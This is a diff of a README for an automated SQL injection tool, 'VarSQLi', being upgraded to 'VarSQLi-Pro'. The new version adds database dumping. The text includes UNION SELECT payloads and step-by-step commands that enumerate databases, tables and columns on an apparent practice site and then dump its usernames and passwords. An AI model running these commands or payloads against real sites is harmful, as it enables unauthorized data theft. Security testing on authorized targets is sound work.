@@ -2,100 +2,86 @@
 - [![Python|3.x](https://img.shields.io/badge/python-3.x-yellow.svg)](https://www.python.org/)
 - [![License](https://img.shields.io/badge/license-GPLv1-red.svg)](https://raw.githubusercontent.com/sqlmapproject/sqlmap/master/LICENSE)
 - [![Twitter](https://img.shields.io/badge/twitter-@Anonym0us_VNPC-blue.svg)](https://twitter.com/Anonym0us_VNPC)
-# Variable-SQL-Injection
-### Note From VarSQLi
-> - _admin_ : [Twitter](https://twitter.com/Anonym0us_VNPC)
-> - _Website_ : [Ghost Man](https://ghostmanews.blogspot.com)
-> - _facebook_ : [adonis bertha](https://www.facebook.com/francesca.savino.18?mibextid=ZbWKwL)
-> - _Github_ : @Phamchie
 
-VarSQLi allows users to search for and exploit SQL injection vulnerabilities automatically. The tool employs techniques such as input string testing, SQL syntax analysis, and SQL statement testing to determine if a system is susceptible to SQL injection.
-> warning: the tool will not have a dump database function, for the sake of protecting other people's private information, and absolutely not used for any other bad purpose, especially exploiting government and school sites  learn
+
+# Variable SQL Injection Pro
+VarSQLi-Pro or Variable SQL Injection Pro - is an upgraded version of VarSQL, a tool designed to detect and exploit SQL Injection vulnerabilities in web applications. SQL Injection is a common security vulnerability in web applications that allows attackers to perform malicious actions and gain unauthorized access to databases.
+
+> VarSQLi-Pro is designed to assist security professionals and those interested in web application security testing in identifying and exploiting SQL Injection vulnerabilities. The tool automatically scans and searches for weaknesses in web applications, and provides users with options to execute SQL Injection attacks and test the security of the system.
 ### Screenshot
-<img src="https://raw.githubusercontent.com/Phamchie/varsqli/VarSQLi/data/Screenshot_2023-08-02-00-24-06-25.jpg">
+<img src="https://raw.githubusercontent.com/Phamchie/varsqli-pro/main/Img/Screenshot_2023-08-04-15-49-15-17.jpg">
 
-However, using VarSQLi or any other database exploitation tool to attack someone else's database is illegal and can have serious consequences. Illegally accessing someone else's database may violate information security regulations and ethical standards in information technology.
+However, it is important to use this tool responsibly and within legal boundaries. Unauthorized access to databases or conducting attacks without proper authorization is illegal and unethical. The use of this tool should only be for educational, research, and improving the security of web applications.
 
-> Using VarSQLi or any unauthorized database exploitation tool can lead to imprisonment and criminal liability. We must adhere to security regulations and policies, respect privacy rights, and refrain from compromising others' systems and data.
+> When using VarSQLi-Pro or any other security testing tool, always adhere to rules and regulations. Protecting personal information and ensuring security is our responsibility and should be ensured in all online activities.
 
->> Instead of relying on database exploitation tools, we should focus on enhancing our knowledge of security, understanding common security vulnerabilities, and implementing security measures to protect our systems and data. Collaborating with security experts and complying with legal regulations will ensure safety and ethical use of information technology
+>> Always strive to learn and understand security concepts to effectively protect web applications and databases.
 
-### setup - install tool
-To set up VarSQLi, follow these steps:
+## Setup And install 
+- Step 1: Open a terminal or command prompt on your computer.
 
-1. Clone the VarSQLi repository from GitHub using the following command:
-- `git clone https://github.com/Phamchie/varsqli`
-2. Navigate to the VarSQLi directory:
-- `cd varsql`
-3. Install the required dependencies by running the setup script:
-- `python3 setup.py`
-- `python3 varsqli.py --help`
-> Full Source Setup
+- Step 2: Navigate to the folder where you want to store the VarSQLi-Pro source code.
+
+- Step 3: Run the following command to clone the source code from the Git repository:
+`git clone https://github.com/Phamchie/varsqli-pro`
+
+- Step 4: After the copying is complete, move to the newly created VarSQLi-Pro folder:
+`cd VarSQLi-Pro`
+
+- Step 5: Install the dependent libraries by running the following command:
+`pip install -r requirements.txt`
+
+- Step 6: After successful installation, you can run VarSQLi-Pro with the command:
+`python3 varsqli.py`
 ```
-git clone https://github.com/Phamchie/varsqli/
-cd varsqli
-python3 setup.py
+git clone https://github.com/Phamchie/varsqli-pro
+cd varsqli-pro
+pyton3 setup.py
 python3 varsqli.py --help
 ```
-> Once the setup is complete, you can start using VarSQLi to identify and exploit SQL injection vulnerabilities. However, always ensure that you have proper authorization and adhere to legal and ethical guidelines when conducting security assessments.
-
-### Demo Attack 
-<img src="https://raw.githubusercontent.com/Phamchie/varsqli/VarSQLi/.github/workflows/lv_0_20230803103153.gif">
-
-#### How To Injection - Exploit 
-- You can see that in the `--help` section, there is only one mode, `--url` and `--exploit` to update the url to attack and start Exploit
+- Note: Make sure that you have the right to access and use this tool for its lawful purposes. Using this tool unethically or in violation of the law can have serious consequences. Please always follow the cybersecurity rules and regulations and use this tool responsibly
+### How To Used ?
+- To use this tool first, I will introduce the tool modes
 ```
-              ___
- _____         H  _____     _ _  {1.1.5}
-|  |  |___ ___[,]|   __|___| |_|
-|  |  | .'|  _[(]|__   | . | | | {Pham Chien}
- \___/|__,|_| [)]|_____|_  |_|_|
-               V         |_|  ghostmanews.blogspot.com
-
-
-[+] Remember, using VarSQLi or any similar tool for illegal activities can result in severe legal consequences, including imprisonment. It is crucial to prioritize ethical hacking practices, collaborate with security professionals, and comply with relevant laws and regulations to ensure responsible and lawful use of such tools.
-
-usage: varsqli.py [-h] [--url URL]
-
-VarSQLi - Auto SQL Injection tools
-
 options:
-  -h, --help  show this help message and exit
-  --url URL   URL Target (ex :            https://test.com/yourpath_vulnsqli.php?id=1)
-
-  --exploit   start exploit
+  -h, --help         show this help message and exit
+  -u URL, --url URL  URL Target ( e.g : https://test.com?path_vuln.php?id=1)
+  --dbs              Enumerate DBMS databases
+  --tables           Enumerate DBMS database tables
+  --columns          Enumerate DBMS database table columns
+  -D DB              DBMS database to enumerate
+  --dump-all         Dump All DBMS database table columns
+  -T TB              Enumerate database to enumerate tables ( ex : --dump-all -T < tables name > -C < columns name >)
+  -C CO              Enumerate database to enumerate columns ( ex : --dump-all -T < tables name > -C < columns name >)
 ```
-- To attack the target , you write the command :
--  `python3 varsqli.py --url < url vulerable > --exploit`
-- the result will be
+ - after thoroughly learning about the modes, to exploit SQL Injection on a certain SQL database error website, you use this command to extract the database name
+
 ```
-[INFO] Testing connect to target url..
-[INFO] Testing IF the target url content is stable
-[INFO] Target is the content stable..
-[INFO] Testing 'Generic atline queries'..
-[INFO] Testing 'UNION SELECT NUMBER COUNT COLUMNS (MySQL Select).'
-[INFO] Testing Payload '+AND+0+UNION+SELECT+1,2--+-'
-[INFO] Total Response Content HTML stable : 200 OK
-[INFO] Testing Payload '+AND+0+UNION+SELECT+1,2,3--+-'
+$ python3 varsqli.py -u http://testphp.vulnweb.com/listproducts.php?cat=1 --dbs
 ```
-<img src="https://raw.githubusercontent.com/Phamchie/varsqli/main/.github/workflows/Screenshot_2023-08-02-14-49-50-36.jpg">
+<img src="https://raw.githubusercontent.com/Phamchie/varsqli-pro/main/Img/Screenshot_2023-08-04-16-10-49-93.jpg">
+<img src="https://raw.githubusercontent.com/Phamchie/varsqli-pro/main/Img/Screenshot_2023-08-04-16-14-14-40.jpg">
 
-- it is starting to attack, and after a while exploiting with UNION SELECT payloads to get the column number of the website, it will announce like this
-> it is the number of columns, payload , target, user , database and the target's MySQL version
+- After we have extracted and obtained the name of the database, you use options `--tables -D <database name>` , this is the command, extract all databases  In the tables section, the command:
 
-<img src="https://raw.githubusercontent.com/Phamchie/varsqli/VarSQLi/.github/workflows/Screenshot_2023-08-02-14-50-17-53.jpg">
+```
+$ python3 varsqli.py -u http://testphp.vulnweb.com/listproducts.php?cat=1 --tables -D acuart
+```
+<img src="https://raw.githubusercontent.com/Phamchie/varsqli-pro/main/Img/Screenshot_2023-08-04-16-29-35-14.jpg">
 
-- like last version, we don't have the feature to print database name and MySQL user, but i guarantee that the latest update version of too right now will have that feature 😃
-> and here is the target database of tables and columns that VarSQLI has exploited
-<img src="https://raw.githubusercontent.com/Phamchie/varsqli/main/.github/workflows/Screenshot_2023-08-02-14-50-35-49.jpg">
-> so we've come to the end, so what's the ending?
+- well , you can see , too got the database name in Tables , okay , next , you guys and I get the database name in columns , we use options as `-  -columns -D <database name>` , and here is the command below
+```
+$ python3 varsqli.py -u http://testphp.vulnweb.com/listproducts.php?cat=1 --columns -D acuart
+```
+<img src="https://raw.githubusercontent.com/Phamchie/varsqli-pro/main/Img/Screenshot_2023-08-04-17-00-16-21.jpg">
 
-# Ending 
-A tip and note to use :
-- Can you see how dangerous the SQL injection vulnerability is, here is a piece of advice for you, this tool is only for the nature, is to show the database name, and will never provide  dump database for users only, to ensure the security of network security
-> Remember, using VarSQLi or any similar tool for illegal activities can result in severe legal consequences, including imprisonment. It is crucial to prioritize ethical hacking practices, collaborate with security professionals, and comply with relevant laws and regulations to ensure responsible and lawful use of such tools.
-# Contact
-> - Contact : [phamchienlc06@gmail.com](phamchienlc06@gmail.com)
-> - Telegram Channel : [My Channel](https://t.me/Anon0psNews)
-> - Telegram : [Adonis Bertha](https://t.me/anonopsvn)
-> - website : [website](https://ghostmanews.blogspot.com)
+- after i see it says find the number of columns entries of the whole database , so tables Users have some columns like : `id` , `cart` , `pass` , `uname` , now I will dump it , to dump the database  , we use options `-D <database name> --dump-all -T <tables item name> -C <column item name>`, command:
+```
+python3 varsqli.py -u http://testphp.vulnweb.com/listproducts.php?cat=1 -D acuart --dump-all -T users -C pass,uname
+```
+- this command I will dump the `password` and `uname` to get the username and password
+- here is the result, password and user are test and test
+<img src="https://raw.githubusercontent.com/Phamchie/varsqli-pro/main/Img/Screenshot_2023-08-04-17-07-59-22.jpg">
+
+### ending
+- Remember, using VarSQLi-Pro or any similar tool for illegal activities can result in severe legal consequences, including imprisonment. It is crucial to prioritize ethical hacking practices, collaborate with security professionals, and comply with relevant laws and regulations to ensure responsible and lawful use of such tools.
